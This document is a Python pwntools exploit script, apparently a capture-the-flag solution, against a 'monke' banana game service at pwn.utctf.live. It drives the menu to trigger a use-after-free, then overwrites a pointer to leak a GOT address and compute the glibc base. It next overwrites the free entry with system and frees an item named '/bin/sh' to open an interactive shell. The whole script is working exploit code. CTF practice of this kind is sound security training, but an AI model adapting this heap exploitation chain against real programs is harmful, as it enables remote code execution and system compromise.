#!/usr/bin/python
import pwn

class MonkeExploit:
    """
    Eats the useless messages returned by the server
    """
    def eatmessage(self):
        if self.banana_unlocked:
            self.s.recvuntil("3: take banana\n")
        else:
            self.s.recvuntil("2: inventory\n")
    
    def walk(self, direction):
        s = self.s
        s.sendline("0")
        s.recvuntil("[n|s|e|w]\n")
        s.sendline(direction)
        buf = s.recvline()
        self.eatmessage()
        return buf

    def take_banana(self, name):
        # send "take banana" option
        s = self.s
        s.sendline("3")
        s.recvuntil("like the name to be:\n")
        s.sendline("%s" % (len(name) + 2))
        s.recvuntil("like to name it:\n")
        s.sendline(name)
        self.eatmessage()

    def eat_banana(self, item):
        s = self.s
        s.sendline("2")
        s.sendline("%d" % item)
        s.recvuntil("rename]:")
        s.sendline("eat")
        self.eatmessage()

    def __init__(self, is_remote=False):
        if not is_remote:
            self.s = pwn.process("./monke")
            self.libc = pwn.ELF("/usr/lib/libc.so.6")
        else:
            self.s = pwn.remote("pwn.utctf.live", 9999)
            self.libc = pwn.ELF("libc-2.27.so")
        self.banana_unlocked = False

        # Walk until we have bananas
        print(self.walk("s"))
        self.banana_unlocked = True
        print(self.walk("s"))

        # Create a dummy banana
        self.take_banana("A"*0x10)

        # Now go to the 4th dimension so we can delete bananas
        self.banana_unlocked = False
        print(self.walk("k"))

        # Walk until we find new bananas
        print(self.walk("n"))
        print(self.walk("n"))
        print(self.walk("n"))

        # This time we get bananas
        self.banana_unlocked = True
        self.walk("n")

        # Trigger the UAF
        self.eat_banana(0)
        self.take_banana("A"*0x10)
        
        # Now try to get a glibc leak
        self.s.sendline("2")
        self.s.sendline("0")
        self.s.recvuntil("rename]:\n")
        self.s.sendline("rename")
        self.s.recvuntil("like to name it:\n")
        FGETS_ADDR = 0x602018
        self.s.sendline(pwn.pack(FGETS_ADDR,64) + pwn.pack(0x8, 64))
        self.eatmessage()
        
        self.s.sendline("2")
        print(self.s.recvline())
        print(self.s.recvline())
        glibc_leak = self.s.recvline()[3:-1]
        print(glibc_leak)
        
        glibc_base = pwn.unpack(glibc_leak, len(glibc_leak)*8) - self.libc.symbols['free']
        print(hex(glibc_base))
        SYSTEM_ADDR = glibc_base + self.libc.symbols['system']

        # Rename the second banana, which will write into free relro entry
        self.s.sendline("1")
        self.s.recvuntil("rename]:\n")
        self.s.sendline("rename")
        self.s.recvuntil("like to name it:\n")
        self.s.sendline(pwn.pack(SYSTEM_ADDR, 48))
        self.eatmessage()

        self.take_banana("/bin/sh")
        self.s.sendline("2")
        print(self.s.recvline())
        print(self.s.recvline())
        print(self.s.recvline())
        print(self.s.recvline())
        self.s.sendline("2")
        print(self.s.recvline())
        self.s.sendline("eat")
        self.s.interactive()
s = MonkeExploit(True)